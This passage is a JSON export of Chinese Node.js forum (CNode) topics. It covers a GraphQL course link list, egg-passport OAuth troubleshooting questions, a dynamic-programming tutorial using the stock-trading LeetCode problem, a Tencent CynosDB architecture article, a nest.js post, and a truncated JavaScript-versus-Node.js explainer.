href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-22-zai-react-zhong-fa-song-cha-xun-yu-ju\">诱人的 GraphQL 视频教程 #22 在 React 中发送查询语句</a>「Pro」「09:28」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-23-zai-zu-jian-zhong-xian-shi-yuan-cheng-de-shu-ju\">诱人的 GraphQL 视频教程 #23 在组件中显示远程的数据</a>「Pro」「05:07」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-24-tian-jia-zeng-jia-book-de-biao-dan-zu-jian\">诱人的 GraphQL 视频教程 #24 添加增加 Book 的表单组件</a>「Pro」「06:45」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-25-zu-zhi-dai-ma-wai-bu-cha-xun-wen-jian\">诱人的 GraphQL 视频教程 #25 组织代码 - 外部查询文件</a>「Pro」「03:38」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-26-geng-xin-zu-jian-de-state\">诱人的 GraphQL 视频教程 #26 更新组件的 state</a>「Pro」「03:40」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-27-zu-he-mutations-he-queries\">诱人的 GraphQL 视频教程 #27 组合 Mutations 和 Queries</a>「Pro」「10:59」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-28-mutation-cha-xun-bian-liang\">诱人的 GraphQL 视频教程 #28 Mutation 查询变量</a>「Pro」「04:29」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-29-mutation-refetchqueries\">诱人的 GraphQL 视频教程 #29 Mutation refetchQueries</a>「Pro」「05:12」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-30-book-details-component\">诱人的 GraphQL 视频教程 #30 Book Details Component</a>「Pro」「07:30」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-31-fa-song-qing-qiu-xian-shi-book-details\">诱人的 GraphQL 视频教程 #31 发送请求显示 Book Details </a>「Pro」「08:57」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-32-zeng-jia-css-yang-shi\">诱人的 GraphQL 视频教程 #32 增加 CSS 样式</a>「Pro」「06:58」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-33-wang-ye-tiao-shi-gong-ju\">诱人的 GraphQL 视频教程 #33 网页调试工具</a>「Pro」「」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-graphql-shi-pin-jiao-cheng-34-zong-jie-yu-gui-hua\">诱人的 GraphQL 视频教程 #34 总结与规划</a>「Pro」「03:03」</p>\n</div>","title":"诱人的 GraphQL 视频教程（34 个视频）更新完成","last_reply_at":"2018-12-20T05:36:57.746Z","good":false,"top":false,"reply_count":8,"visit_count":1234,"create_at":"2018-12-13T06:06:51.421Z","author":{"loginname":"yinsigan","avatar_url":"https://avatars2.githubusercontent.com/u/740643?v=4&s=120"}},{"id":"5c1b203676c4964062a1bb41","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>第一个问题，明明已经获取了数据，但是老是报如下错：\n<img src=\"//static.cnodejs.org/FlWD6qjYLTLmSoZFyXiLPzNqq-2o\" alt=\"image.png\"></p>\n<p>第二个问题，获取数据中，refreshToken 为 undefined：\n<img src=\"//static.cnodejs.org/FiCDPjEJiGNvjz5EDYrwwZrxCo1L\" alt=\"image.png\"></p>\n<p>这是为啥呀，我都是按照文档一步一步做的？？？？？？？？？？？？？？？？？？？？？</p>\n</div>","title":"请问下在使用 egg-passport-github 中，在 app.passport.verify 中获取了 github 数据，但是一直出现两个问题？","last_reply_at":"2018-12-20T04:53:10.985Z","good":false,"top":false,"reply_count":0,"visit_count":477,"create_at":"2018-12-20T04:53:10.985Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c1b091176c4964062a1ba44","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>昨天同事说动态规划很难，我说不会啊，理解了就很简单，我同事表示不屑，以为我在炫技。于是乎我问了一个工作六年的前同事，他居然也觉得高大上，并且表示接触过会动态规划的朋友，觉得很牛逼。</p>\n<p>我了个天，表示震惊了，简直吓的我瑟瑟发抖发抖好么。既然如此，那我一定要让大家理解，让大家也牛逼牛逼。</p>\n<h1>以题举例</h1>\n<p>以中国leetcode（力扣）的121道题《买卖股票的最佳时机》举例，题目如下：</p>\n<pre class=\"prettyprint\"><code>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。\n\n如果你最多只允许完成一笔交易（即买入和卖出一支股票），设计一个算法来计算你所能获取的最大利润。\n\n注意你不能在买入股票前卖出股票。\n\n示例 1:\n\n输入: [7,1,5,3,6,4]\n输出: 5\n解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。\n注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格。\n\n示例 2:\n\n输入: [7,6,4,3,1]\n输出: 0\n解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。\n</code></pre><p>首先说明一点，在这道题动态规划并不算是高效的算法，这道题即使是暴力法也能比动态规划法要快一些，但本文是为了讲动态规划才讲这道题的，而非为了这道题讲动态规划的。纯粹是这道题讲动态规划更简单。</p>\n<p>不了解动态规划的朋友可能不知道，动态规划几乎都是存在套路的，步骤如下：</p>\n<ol>\n<li>将问题拆解成单一问题制表</li>\n<li>根据表中结果进行求解</li>\n</ol>\n<h1>第一步：将问题拆解成单一问题制表</h1>\n<p>这是动态规划的重中之重，拆的好坏基本决定你动态规划写的好坏，动态规划更是一种思想。</p>\n<p>这道题就很简单了，我们可以把这个问题，先拆成单一问题，即<code>如果我在这天买入，在哪天卖出最高？</code>\n我们按题目中的示例 1举例，价格数组为[7,1,5,3,6,4]。</p>\n<p>比如我在第一天买入，在哪天卖出最高呢？我们可以得到这样一张表(不能交易标记X)：</p>\n<table>\n<thead>\n<tr>\n<th>买入时间</th>\n<th>买入价格</th>\n<th>单天价格</th>\n<th>7</th>\n<th>1</th>\n<th>5</th>\n<th>3</th>\n<th>6</th>\n<th>4</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>–</td>\n<td>–</td>\n<td>卖出时间</td>\n<td>第一天</td>\n<td>第二天</td>\n<td>第三天</td>\n<td>第四天</td>\n<td>第五天</td>\n<td>第六天</td>\n</tr>\n<tr>\n<td>第一天</td>\n<td>7</td>\n<td>获利程度</td>\n<td>X</td>\n<td>-6</td>\n<td>-2</td>\n<td>-4</td>\n<td>-1</td>\n<td>-3</td>\n</tr>\n</tbody>\n</table>\n<p>填表原因如下：</p>\n<ul>\n<li>即因为你是第一天买入的，所以第一天不能交易，所以填X</li>\n<li>我们第一天买入的，买入价格为7，第二天值1，所以我们卖出则赚了-6.</li>\n<li>我们第一天买入的，买入价格为7，第三天值5，所以我们卖出则赚了-2.</li>\n<li>我们第一天买入的，买入价格为7，第四天值3，所以我们卖出则赚了-4.</li>\n<li>我们第一天买入的，买入价格为7，第五天值6，所以我们卖出则赚了-1.</li>\n<li>我们第一天买入的，买入价格为7，第六天值4，所以我们卖出则赚了-3.</li>\n</ul>\n<p><code>有人说这个不是暴力解法么？额，这道题的动态规划的制表过程确实有点像。</code></p>\n<p>那么根据以上规则，如果我们是第二天买入的话，这个表格是不是就是这样的。</p>\n<table>\n<thead>\n<tr>\n<th>买入时间</th>\n<th>买入价格</th>\n<th>单天价格</th>\n<th>7</th>\n<th>1</th>\n<th>5</th>\n<th>3</th>\n<th>6</th>\n<th>4</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>–</td>\n<td>–</td>\n<td>卖出时间</td>\n<td>第一天</td>\n<td>第二天</td>\n<td>第三天</td>\n<td>第四天</td>\n<td>第五天</td>\n<td>第六天</td>\n</tr>\n<tr>\n<td>第二天</td>\n<td>1</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>4</td>\n<td>2</td>\n<td>5</td>\n<td>3</td>\n</tr>\n</tbody>\n</table>\n<p>那么我合并这两张表是不是就是这样的：</p>\n<table>\n<thead>\n<tr>\n<th>买入时间</th>\n<th>买入价格</th>\n<th>单天价格</th>\n<th>7</th>\n<th>1</th>\n<th>5</th>\n<th>3</th>\n<th>6</th>\n<th>4</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>–</td>\n<td>–</td>\n<td>卖出时间</td>\n<td>第一天</td>\n<td>第二天</td>\n<td>第三天</td>\n<td>第四天</td>\n<td>第五天</td>\n<td>第六天</td>\n</tr>\n<tr>\n<td>第一天</td>\n<td>7</td>\n<td>获利程度</td>\n<td>X</td>\n<td>-6</td>\n<td>-2</td>\n<td>-4</td>\n<td>-1</td>\n<td>-3</td>\n</tr>\n<tr>\n<td>第二天</td>\n<td>1</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>4</td>\n<td>2</td>\n<td>5</td>\n<td>3</td>\n</tr>\n</tbody>\n</table>\n<p>那么我们把这张表弄完整，即把第三天到第五天的买入，那是不是就是这样的。</p>\n<table>\n<thead>\n<tr>\n<th>买入时间</th>\n<th>买入价格</th>\n<th>单天价格</th>\n<th>7</th>\n<th>1</th>\n<th>5</th>\n<th>3</th>\n<th>6</th>\n<th>4</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>–</td>\n<td>–</td>\n<td>卖出时间</td>\n<td>第一天</td>\n<td>第二天</td>\n<td>第三天</td>\n<td>第四天</td>\n<td>第五天</td>\n<td>第六天</td>\n</tr>\n<tr>\n<td>第一天</td>\n<td>7</td>\n<td>获利程度</td>\n<td>X</td>\n<td>-6</td>\n<td>-2</td>\n<td>-4</td>\n<td>-1</td>\n<td>-3</td>\n</tr>\n<tr>\n<td>第二天</td>\n<td>1</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>4</td>\n<td>2</td>\n<td>5</td>\n<td>3</td>\n</tr>\n<tr>\n<td>第三天</td>\n<td>5</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>-2</td>\n<td>1</td>\n<td>-1</td>\n</tr>\n<tr>\n<td>第四天</td>\n<td>3</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>3</td>\n<td>1</td>\n</tr>\n<tr>\n<td>第五天</td>\n<td>6</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>-2</td>\n</tr>\n<tr>\n<td>第六天</td>\n<td>4</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n</tr>\n</tbody>\n</table>\n<p>因为第六天买了的话，已经是最后一天了，所以没办法卖了，所以全是X。</p>\n<h1>第二步：根据表中结果进行求解</h1>\n<p>上一步，已经把如果是某天买的，每天的获利情况列了一遍，就是拆解成了单一问题。</p>\n<p>那么看最大利润，很容易就能看出来了，就看那个数字最大就好了。</p>\n<table>\n<thead>\n<tr>\n<th>买入时间</th>\n<th>买入价格</th>\n<th>单天价格</th>\n<th>7</th>\n<th>1</th>\n<th>5</th>\n<th>3</th>\n<th>6</th>\n<th>4</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>–</td>\n<td>–</td>\n<td>卖出时间</td>\n<td>第一天</td>\n<td>第二天</td>\n<td>第三天</td>\n<td>第四天</td>\n<td>第五天</td>\n<td>第六天</td>\n</tr>\n<tr>\n<td>第一天</td>\n<td>7</td>\n<td>获利程度</td>\n<td>X</td>\n<td>-6</td>\n<td>-2</td>\n<td>-4</td>\n<td>-1</td>\n<td>-3</td>\n</tr>\n<tr>\n<td>第二天</td>\n<td>1</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>4</td>\n<td>2</td>\n<td>5⃣️</td>\n<td>3</td>\n</tr>\n<tr>\n<td>第三天</td>\n<td>5</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>-2</td>\n<td>1</td>\n<td>-1</td>\n</tr>\n<tr>\n<td>第四天</td>\n<td>3</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>3</td>\n<td>1</td>\n</tr>\n<tr>\n<td>第五天</td>\n<td>6</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>-2</td>\n</tr>\n<tr>\n<td>第六天</td>\n<td>4</td>\n<td>获利程度</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n<td>X</td>\n</tr>\n</tbody>\n</table>\n<p>没错emoji的5的就是，那么我们只要简单的遍历一下这个表是不是就能把结果取出来了？<code>嗯，对的</code></p>\n<h1>最后</h1>\n<p>但一般来说动态规划的题目不是这么简单的，通常在制表的时候会涉及一个叠加问题，在根据表计算结果一般也不是简单的遍历就能完成的，但理解动态规划思想应该是没什么问题了。</p>\n<p>个人认为动态规划虽然性能不强，但是能把问题变得很直观，让人更简单的解决问题。同时算法的杂合度不高，很方便使用分布式为问题的每个单一问题进行求解。</p>\n<p>本题代码:<a href=\"https://github.com/zy445566/myBlog/blob/master/20180926leetcode/20181220best-time-to-buy-and-sell-stock/best-time-to-buy-and-sell-stock.js\">best-time-to-buy-and-sell-stock.js</a></p>\n</div>","title":"动态规划难？读完这篇还不理解那就不要请我吃鸡了","last_reply_at":"2018-12-20T03:51:41.045Z","good":false,"top":false,"reply_count":8,"visit_count":806,"create_at":"2018-12-20T03:14:25.868Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"5c1b053176c4964062a1ba23","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FnViSfFbLfErhVz3y1kRiDy_5G_d\" alt=\"image.png\"></p>\n</div>","title":"使用 egg-passport-github  一直报错 Unauthorized","last_reply_at":"2018-12-20T03:37:26.861Z","good":false,"top":false,"reply_count":1,"visit_count":407,"create_at":"2018-12-20T02:57:53.488Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c1b0cb23898674067a76467","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<blockquote>\n<p>本文作者：孙旭，腾讯数据库开发工程师，9年数据库内核开发经验；熟悉数据库查询处理，并发控制，日志以及存储系统；熟悉PostgreSQL（Greenplum，PGXC等）、Teradata等数据库内核实现机制。</p>\n</blockquote>\n<p>CynosDB 是腾讯数据库研发团队推出的自研数据库，有PostgreSQL和MySQL两个版本。本文以兼容PostgreSQL版CynosDB为例，介绍我们的架构设计和优化思路。</p>\n<h1>1、概述</h1>\n<p>PostgreSQL是世界上最先进的开源数据库，始于1986年，有30多年的社区演进历史。其先进的架构、可靠性以及丰富的功能已经获得业界高度认可。同时，PostgreSQL能够在多种操作系统上运行，支持多种索引类型和扩展，特别是对PostGIS扩展的支持，可以让PostgreSQL轻松的处理地理信息数据。</p>\n<p>兼容PostgreSQL版CynosDB作为PostgreSQL在NewSQL领域的一个产品，也具有良好的扩展性。由其架构特点带来的资源池化，可以让用户付出更少的成本而获得同等的性能，并且不损失PostgreSQL数据库原有的功能特性。</p>\n<h1>2、基础架构</h1>\n<p>现有共有云上的数据库存在一些不足：</p>\n<p>1.网络IO重。传统云上的主备架构下，会有大量数据需要写到磁盘，主要包括：WAL LOG、脏页数据、防止页部分写的Double Write或者Full Page Write。</p>\n<p>2.主从实例不共享数据。一方面浪费了大量存储，另一方面进一步加重了网络IO。这样会导致磁盘利用率低、CPU闲置等问题。</p>\n<p>而CynosDB可以通过日志下沉、共享存储来解决上述问题，以实现共有云数据库的高性价比、高可用性以及弹性扩展。其基础架构如下：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/tecyykrous.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>架构中的组件：</p>\n<p>\\1. master是数据库的主实例，负责接收应用的读写事务请求。</p>\n<p>\\2. slave是数据库的只读实例，负责处理应用的读请求，可以支持多个slave实例。</p>\n<p>\\3. CynosStore Client提供访问分布式存储（CynosStore）的接口。DB引擎通过这些接口访问存储，完成数据文件的读写等操作。</p>\n<p>\\4. CynosStore是一个分布式存储系统，存放数据库的数据和日志，并负责日志到数据页面的转换。</p>\n<p>\\4. 集群管理服务负责整个系统的管理，例如：存储扩容，实例创建等。</p>\n<p>\\5. 冷备存储用来存储系统的日志。</p>\n<p>master实例将数据的变更以日志方式发送到存储系统（CynosStore）中，同时CynosStore会定期将日志合并到数据页面上。因此，CynosDB无需将脏页写入到存储中，这点与传统数据库是不同的。slave数据库实例没有写事务，不会向存储发送日志，但是会从存储中读取页面，也会接收master实例的日志来刷新内存中的数据页面；如果收到的日志所对应的页面没有在slave的内存中，则会丢弃这些日志。</p>\n<p>从架构上看，CynosDB实现了存储和计算分离，并把资源进行池化，因此适合云上部署。而且计算和存储传输数据的仅有日志流，无需写脏页面，因此也减少了系统中的网络量。总的来说，CynosDB具有如下优势：</p>\n<p>1.计算能力弹性扩展。可以快速增加slave节点来扩展读能力，而不必进行全量的数据拷贝。</p>\n<p>\\2. 存储能力弹性扩展。不像传统数据库那样受单机存储能力的限制。</p>\n<p>\\3. 充分利用硬件资源。缓解传统主备架构中的CPU闲置、磁盘利用率不高等问题。</p>\n<p>\\4. 备份容易。备份完全由后台持续进行，用户无需干预。</p>\n<h1>3、兼容PostgreSQL版CynosDB的计算层架构</h1>\n<p>CynosDB实现了计算与存储分离，系统也因此被分成两大块：计算层和存储层。计算层负责SQL解析、日志生成等；存储层负责数据存储、日志归档以及日志合并等。本节以CynosDB的PostgreSQL兼容版本为例来介绍计算层架构。其计算层架构如下图所示。为了实现这种NewSQL架构，我们对PostgreSQL内核做了新设计：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/kvk0k6q2ui.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>灰色部分是PostgreSQL内核原生模块：</p>\n<p>\\1. SQL：PostgreSQL的SQL引擎，包括词法/语法分析、语义分析、查询重写/优化和查询执行。CynosDB的设计不涉及SQL层改动，因此它兼容PostgreSQL原来的SQL语法和语义。</p>\n<p>\\2. Access：数据库的访问层，定义了对象的组织方式和访问方法。其中包括：</p>\n<p>lHeap：表实现以及访问方法，包括扫描、更新、插入、删除等。</p>\n<p>lbtree/gin/gist/spgist/hash/brin：索引实现，包括各种索引的实现和操作方式，如索引扫描、插入等。</p>\n<p>lCLOG/MultiXACT：与事务提交状态以及并发等。</p>\n<p>Access是设计和优化的重点模块。当表和索引等数据库对象被修改时，原生的PostgreSQL会生成XLog，并写入到日志文件中。在CynosDB中，这些对象修改时也会生成日志，但是这些日志不会写本地的日志文件，而是发送到CynosStore中。</p>\n<p>\\3. storage/buffer：buffer pool和存储管理，调用文件接口对数据文件进行读写。在CynosDB中使用CynosStore Client对CynosStore中的文件进行操作。</p>\n<p>\\5. CynosStore Client提供访问CynosStore的接口，以完成数据库对数据文件的操作。包括数据页面读取接口、日志发送接口等。</p>\n<p>\\6. 分布式存储CynosStore是一个基于日志的分布式的块存储，在本文中不做重点介绍。</p>\n<p>CynosDB的计算层把数据文件修改所生成的日志，通过CynosStore Client发送到分布式存储CynosStore中，而CynosStore会将日志定时合并到数据页面上。这里比较重要的一点是，计算层写出日志并不是PostgreSQL原生的XLog，而是我们自己重新设计的日志系统和日志格式。因此CynosDB不依赖于PostgreSQL的原生日志系统，这种设计也可以让我们有机会在CynosDB上做更多的性能优化。具体可以参见下节。</p>\n<h1>4、架构优化</h1>\n<p>CynosDB计算层的架构设计遵循了如下思路：</p>\n<p>1.“极简IO”。即，降低网络/磁盘IO</p>\n<p>\\2. 高效的系统设计。异步的日志设计、降低计算层CPU负载</p>\n<p>通过这些设计，使CynosDB的性能比云上的同等配置性能要高。本节主要介绍计算层所做的优化手段。</p>\n<h2>4.1 日志系统</h2>\n<p>兼容PostgreSQL版CynosDB的底层存储CynosStore是一个支持日志写的、可以提供多版本读的、分布式的块设备，DB引擎对存储中文件的修改，都是以日志的方式发送到存储中。其日志格式是：&lt;页面号，页面偏移，修改内容，修改长度&gt;，含义是：在页面的哪个偏移做了什么内容的修改。这样设计的日志是幂等的。</p>\n<p>以表插入元组为例，PostgreSQL原来的XLog日志格式可能是：</p>\n<p>&lt;relfilenode, pageno, offsetnum,informask2,infomask,hoff,tuple_data&gt;：代表在页面（由relfilenode和pageno来确定一个页面）的offsetnum位置插入一条元组，插入的元组是在恢复时由informask2, infomask, hoff, tuple_data等信息进行重构。</p>\n<p>同样的操作，在CynosDB中生成的日志可能如下。假设在页面号为n的页面上插入元组tuple：</p>\n<p>&lt;n,10,(char *) &amp;pd_flag,2&gt; – 保存页面头pd_flag到日志</p>\n<p>&lt;n,12,(char *) &amp;pd_lower,2&gt; – 保存页面头pd_lower到日志</p>\n<p>&lt;n,14,(char *) &amp;pd_upper,2&gt; – 保存页面头pd_upper到日志</p>\n<p>&lt;n,36,(char *) &amp;ItemIdData,4&gt; – 保存ItemIdData数组的第3个元素到日志</p>\n<p>&lt;n,7488,(char *) tuple,172&gt; – 保存tuple到日志</p>\n<p>这些条目记录了页面在插入元组时的所有修改，它们最终会在CynosStore Client中形成一个MTR（mini-transaction record：多条日志的集合，代表对数据库存储结构的一次原子修改，例如：btree结构、页面结构的修改；在日志重放的时候需要将一个MTR的所有日志都应用完毕，否则会导致数据库存储结构的破坏），并放到日志流中发送到存储。当存储需要将这个MTR合并到页面时，要保证MTR中的所有日志应用完毕，任何不完全的应用都会导致页面结构不正确。</p>\n<p>利用日志特点，我们对PostgreSQL 的内核进行了优化，而优化之后的日志大小开销与PostgreSQL的原生XLOG差不多。这些优化和设计包括：</p>\n<p>\\1. 移除原本PostgreSQL中full page write（FPW）特性。为了保证系统crash再重启之后，那些部分写的页面（torn page）可以被正确恢复，PostgreSQL在Checkpoint之后，对页面执行第一次被修改时，会将整个页面记录到日志中，这种特性就是FPW，类似MySQL的double write。当crash recovery时，系统会以这个全页作为基页面进行日志回放，并将恢复好的页面写到存储，而不必关心存储页面中的页面是否是半页。由于CynosDB日志的幂等性，当出现半页写时，系统直接重新在此页面上直接进行日志回放，即可将页面修复到一致状态。因此CynosDB中无需原生的FPW，从而减少了日志量。</p>\n<p>\\2. 移除系统中脏页面刷盘操作。CynosDB通过日志保存页面的修改，并且可以通过在基页上合并日志而得到最新页面，因此无需原本系统的刷脏操作，仅仅刷日志就足够。</p>\n<p>通过如上优化，可以很大程度上减少网络IO和日志量。</p>\n<p>\\3. 除了以上对PostgreSQL内核的优化，CynosDB对日志的记录方式也进行了精简和压缩。CynosDB的日志都有日志头（LogHeader），如果修改同一个页面的多条日志共享一个日志头，则可以省去多个日志头的开销，如下图所示：</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/bpdf9lor8n.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>LH代表LogHeader，Log Element代表对页面的页一次修改。如上图，有两条对Block1的修改日志，并且每个修改都有一个日志头（LH），经过日志头合并优化后，形成新的MTR中，修改Block1的那些日志共享了同一个日志头。</p>\n<p>如果修改同一个页面的两条日志是相邻的，那么可以将两条日志进一步合并成一条日志。这种方式减少了日志条目，从而可以提高日志合并和页面生成速度。</p>\n<h2>4.2 页面CRC</h2>\n<p>在PostgreSQL中，页面在刷盘前会计算并填充页面的CRC属性，而在CynosDB中，如果为CRC也生成了一条日志写入到存储中的话，会增加计算节点的CPU负担和日志条数。为了解决这个问题，我们将CRC的计算任务下放到存储中，从而减轻了计算层的CPU负担，以及日志条数。</p>\n<h2>4.3 异步表扩展</h2>\n<p>原生的PostgreSQL数据库使用的是本地文件系统存储数据，其文件扩展操作同步并实时的反映到磁盘文件上。但是CynosDB的扩展操作是通过日志实现，如果每次扩展都对日志做一次flush操作，让扩展实时的反应到存储上，势必会影响系统的性能。因此，我们实现了文件的异步扩展，即文件扩展的日志先保留在系统的日志buffer中，而不是每次扩展都实时的刷新到存储中，当事务提交的时候再把这些日志刷到存储上，对数据批量导入的性能提升很明显。另外，扩展操作可以一次性在文件中扩展出多个页面，减少调用扩展操作的次数。</p>\n<h1>后续</h1>\n<p>后续我们会在新硬件、多Master架构等领域作更多探索，为云上的数据库产品形态带来更多惊喜和亮点。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"做优化的数据库工程师请参考！CynosDB的计算层设计优化揭秘","last_reply_at":"2018-12-20T03:29:54.841Z","good":false,"top":false,"reply_count":0,"visit_count":448,"create_at":"2018-12-20T03:29:54.841Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c1b05f53898674067a76422","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fm4GRJCaXbrs1WgoJOYwYpHeH694\" alt=\"image.png\"></p>\n<p>试过如上办法，但是不行，求方案~~</p>\n</div>","title":"前后端分离的项目，在使用 egg-passport 中，后端获取数据后不知道如何返回给前端？","last_reply_at":"2018-12-20T03:27:03.233Z","good":false,"top":false,"reply_count":2,"visit_count":501,"create_at":"2018-12-20T03:01:09.200Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c199d5576c4964062a1b176","author_id":"5a7a5d505321b5396004ec1e","tab":"share","content":"<div class=\"markdown-text\"><p><strong>一直以来，node.js 都被嘲笑为前端的附属品，做不了后端。\n即使是 express  koa 这样的框架出来，也没能改变大家对于node.js的看法，直到 nest.js 问世，才真正解决了问题——架构。\n甚至一些 javaer 和 laraveler  也纷纷涌入它的怀抱。</strong></p>\n<p>nest.js 第一个版本发布于去年11月，从此star 数就在猛涨：</p>\n<p>目前两个框架的star 数都在11k</p>\n<p><img src=\"//static.cnodejs.org/FpD3-CXXAPkabQWs1i40zPwBJf7i\" alt=\"image.png\"></p>\n<p>npm 下载量也在 egg 的十倍左右： （注： 未统计 cnpm 下载量）\n<img src=\"//static.cnodejs.org/FuroTbBjIuLZCeBZYsbl3ulLnrRX\" alt=\"image.png\"></p>\n<h3>那么nest.js 有什么神奇的地方呢？</h3>\n<p>Nest.js 受到了 Angular  的启发，甚至很多装饰器命名也完全一样，基本上可以无缝切换前后端。</p>\n<p>（待更新）</p>\n<p>英文官方文档： <a href=\"https://docs.nestjs.ccom/\">https://docs.nestjs.ccom/</a>\n中文非官方文档：<a href=\"https://docs.nestjs.cn/\">https://docs.nestjs.cn/</a></p>\n<p>Github: <a href=\"https://github.com/nestjs/nest/\">https://github.com/nestjs/nest/</a></p>\n<p>除此之外，阿里最近也出了类似的 midway 框架。不过还没发布正式版。\n围观地址： <a href=\"https://github.com/midwayjs/midway\">https://github.com/midwayjs/midway</a></p>\n</div>","title":"发布一年，star 数和下载量 超越 egg ，最近很火的nest.js 框架","last_reply_at":"2018-12-20T02:30:51.170Z","good":false,"top":false,"reply_count":21,"visit_count":1635,"create_at":"2018-12-19T01:22:29.611Z","author":{"loginname":"zuohuadong","avatar_url":"https://avatars0.githubusercontent.com/u/11203929?v=4&s=120"}},{"id":"5c1a1e7f76c4964062a1b72e","author_id":"5af262b80a36e5312d6ece81","tab":"share","content":"<div class=\"markdown-text\"><p>很多小伙伴学Node的时候，都没有好好认识她就开始疯狂追求，想一举拿下，直接在网上搜索Node实战，想知道她活好不好，想先用她建个简单博客练练手。</p>\n<p><strong>JavaScript和Nodejs</strong>\n我相信很多入坑Nodejs的人都是前端转过来的，但是局限于公司项目用不到Nodejs，只能自学<a href=\"https://www.sucaihuo.com/video/224-0-0\">Nodejs视频教程</a>，有些重要且基础的东西就忽略了。\n下面我们说一下前端的Javascript和Nodejs。每个前端大虾都很了解JavaScript，我们用它操作dom，用它写数据交互和页面效果，but…\n请问你真的知道JavaScript吗？\n我保证还有很多不知道JavaScript=ECMAScript+DOM+BOM。\n现在就可以知道了，前端的JavaScript其实是由ECMAScript、DOM、BOM组合而成。</p>\n<p><strong>JavaScript：</strong></p>\n<ul>\n<li>ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)</li>\n<li>DOM（一些操作页面元素的方法）</li>\n<li>BOM（一些操作浏览器的方法）</li>\n</ul>\n<p>上面是JavaScript的组成部分，那么Nodejs呢？</p>\n<p><strong>Nodejs：</strong></p>\n<ul>\n<li>ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)</li>\n<li>os(操作系统)</li>\n<li>file(文件系统)</li>\n<li>net(网络系统)</li>\n<li>database(数据库)</li>\n</ul>\n<p>分析：很容易看出，前端和后端的js相同点就是，他们的语言基础都是ECMAScript，只是他们所扩展的东西不同，前端需要操作页面元素，于是扩展了DOM，也需要操作浏览器，于是就扩展了BOM。而服务端的js则也是基于ECMAScript扩展出了服务端所需要的一些API，稍微了解后台的童鞋肯定知道，后台语音有操作系统的能力，于是扩展os，需要有操作文件的能力，于是扩展出file文件系统、需要操作网络，于是扩展出net网络系统，需要操作数据，于是要扩展出d